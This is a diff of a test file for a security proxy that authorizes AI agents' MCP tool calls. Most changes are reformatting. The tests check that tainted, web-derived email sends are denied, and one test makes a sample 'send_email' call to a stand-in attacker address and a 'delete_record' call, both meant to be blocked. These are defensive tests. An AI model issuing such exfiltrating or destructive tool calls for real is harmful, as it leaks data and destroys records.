@@ -5,6 +5,7 @@ tool call traverses the full pipeline through the one proxy; nothing reaches a
 downstream tool any other way. Includes the non-bypassability assertion, the
 generality (non-Foundry client) smoke test, and end-to-end provenance taint.
 """
+
 from __future__ import annotations
 
 import textwrap
@@ -140,6 +141,7 @@ def _of_type(rep: TraceReplay, event_type: str) -> list[object]:
 
 # --- DoD: allowed tool round-trips through the proxy and executes downstream --
 
+
 async def test_allowed_tool_roundtrips_and_executes_downstream() -> None:
     async with proxy_session(user_input="research pricing") as h:
         result = await h.agent.call_tool("web_fetch", {"url": "https://corp.example/p"})
@@ -155,6 +157,7 @@ async def test_allowed_tool_roundtrips_and_executes_downstream() -> None:
 
 
 # --- DoD: blocked tool returns a clean MCP error -----------------------------
+
 
 async def test_blocked_tool_returns_clean_mcp_error() -> None:
     async with proxy_session() as h:
@@ -173,14 +176,13 @@ async def test_blocked_tool_returns_clean_mcp_error() -> None:
 
 # --- DoD: NO tool ever executes without a SENTINEL span (the architecture lock)
 
+
 async def test_no_tool_executes_without_a_sentinel_span() -> None:
     async with proxy_session(user_input="mixed run") as h:
         # one allowed, two blocked (delete_record always; send_email tainted + bad domain)
         await h.agent.call_tool("web_fetch", {"url": "https://corp.example/a"})
         await h.agent.call_tool("delete_record", {"id": 1})
-        await h.agent.call_tool(
-            "send_email", {"to": "x@evil.test", "subject": "s", "body": "b"}
-        )
+        await h.agent.call_tool("send_email", {"to": "x@evil.test", "subject": "s", "body": "b"})
 
     rep = await h.replay()
     executed_spans = _of_type(rep, "ToolExecuted")
@@ -210,6 +212,7 @@ async def test_no_tool_executes_without_a_sentinel_span() -> None:
 
 # --- DoD: a non-Foundry MCP client is secured by the SAME proxy --------------
 
+
 async def test_non_foundry_client_is_secured_identically() -> None:
     # `agent` here is a vanilla `mcp.client.session.ClientSession` — the exact
     # class ANY non-Foundry integration (Claude, GPT, a bespoke client) speaks.
@@ -233,6 +236,7 @@ async def test_non_foundry_client_is_secured_identically() -> None:
 
 # --- DoD: a web_fetch-derived call is tainted end-to-end through the proxy ----
 
+
 async def test_web_fetch_derived_call_is_tainted_end_to_end() -> None:
     async with proxy_session(user_input="summarize example.com/pricing") as h:
         fetched = await h.agent.call_tool("web_fetch", {"url": "https://example.com/pricing"})
@@ -253,7 +257,9 @@ async def test_web_fetch_derived_call_is_tainted_end_to_end() -> None:
 
     rep = await h.replay()
     email_decisions = [
-        p for p in _of_type(rep, "AuthorizationDecided") if p.tool_name == "send_email"  # type: ignore[attr-defined]
+        p
+        for p in _of_type(rep, "AuthorizationDecided")
+        if p.tool_name == "send_email"  # type: ignore[attr-defined]
     ]
     (email_decision,) = email_decisions
     assert email_decision.decision == "DENY"  # type: ignore[attr-defined]
@@ -263,6 +269,7 @@ async def test_web_fetch_derived_call_is_tainted_end_to_end() -> None:
 
 
 # --- Supporting: the allow path for send_email still works (not block-everything)
+
 
 async def test_clean_send_email_without_tainted_lineage_is_allowed() -> None:
     # User composes an email directly (no web_fetch in the lineage), to an
@@ -274,9 +281,7 @@ async def test_clean_send_email_without_tainted_lineage_is_allowed() -> None:
         )
         assert result.isError is False
 
-    assert h.downstream.outbox == [
-        {"to": "team@corp.example", "subject": "hi", "body": "status"}
-    ]
+    assert h.downstream.outbox == [{"to": "team@corp.example", "subject": "hi", "body": "status"}]
 
 
 async def test_anomalous_lineage_is_denied_not_silently_trusted() -> None:
